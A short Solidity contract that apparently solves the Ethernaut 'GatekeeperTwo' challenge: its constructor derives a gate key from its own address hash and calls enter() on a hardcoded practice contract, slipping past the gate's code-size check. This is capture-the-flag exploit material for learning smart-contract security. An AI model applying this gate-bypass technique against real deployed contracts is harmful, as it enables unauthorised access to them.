pragma solidity ^0.4.18;

contract GatekeeperTwo {
  function enter(bytes8 _gateKey) public returns (bool);
}

contract Unlock {
    function Unlock() public {
        GatekeeperTwo gateContract = GatekeeperTwo(0x3a4c134ec2d51f0ab57bf98956a3ce624e53ee9c);
        bytes8 xorbits = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1));
        gateContract.enter(xorbits);
    }
}
